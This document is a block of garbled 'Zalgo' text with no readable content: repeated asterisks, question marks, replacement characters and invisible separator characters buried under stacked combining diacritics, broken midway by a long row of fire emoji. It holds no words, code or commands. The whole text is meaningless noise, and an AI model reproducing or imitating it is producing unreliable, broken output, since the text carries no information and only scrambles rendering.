̡̣̗̪̤̳̙͓̣͓*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎